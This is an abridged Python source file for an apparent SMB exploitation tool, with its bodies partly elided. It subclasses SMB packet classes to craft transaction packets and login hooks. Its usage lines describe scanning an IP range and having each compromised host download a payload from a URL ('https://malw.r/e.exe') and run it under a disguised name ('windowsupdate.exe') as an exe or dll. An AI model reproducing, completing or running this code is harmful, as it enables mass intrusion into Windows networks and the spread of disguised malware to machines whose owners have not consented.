# Usage python exec.py 1 (loadexe) or 2 (loaddll) , ip , linkfile , stub_name
# Example : python exec.py 1 192.168.1.0/24 https://malw.r/e.exe windowsupdate.exe
#!/usr/bin/python
...
def _put_trans_data(transCmd, parameters, data, noPad=False):
    ...
    offset = 33 + len(transCmd['Parameters']) + 2
    transData = ''
    if len(parameters):
...
def NewSMBPacket_addCommand_hook_login(self, command):
    ...
    if isinstance(command['Parameters'], smb.SMBSessionSetupAndX_Extended_Parameters):
        ...
        if isinstance(command['Parameters'], smb.SMBSessionSetupAndX_Parameters):
...
class MYSMB(smb.SMB):
    ...
    def __init__(self, remote_host, use_ntlmv2=True, timeout=8):
        ...
        self._default_tid = 0
        self._pid = os.getpid() & 65535
        self._last_mid = random.randint(1000, 20000)
        if 16384 <= self._last_mid <= 16656:
            self._last_mid += 288
        self._pkt_flags2 = 0
        self._last_tid = 0
        self._last_fid = 0
    ...
    def nt_create_andx(self, tid, filename, smb_packet=None, cmd=None, shareAccessMode=smb.FILE_SHARE_READ | smb.FILE_SHARE_WRITE, disposition=smb.FILE_OPEN, accessMask=131487):
    ...
    def create_smb_packet(self, smbReq, mid=None, pid=None, tid=None):
        ...
        req = str(pkt)
        return '\x00\x00' + pack('>H', len(req)) + req
    ...
    def create_trans_packet(self, setup, param='', data='', mid=None, maxSetupCount=None, totalParameterCount=None, totalDataCount=None, maxParameterCount=None, maxDataCount=None, pid=None, tid=None, noPad=False):
        ...
        transCmd['Parameters']['Timeout'] = 4294967295L
...
if __name__ == '__main__':
	...
	if len(sys.argv) < 2:
		...
		print(banner)
		print("""
            ip cidr , (1 exe o 2 dll) , payload url , stub name
		""")
		global pe_type
		pe_type = sys.argv[1]
		global auto_url
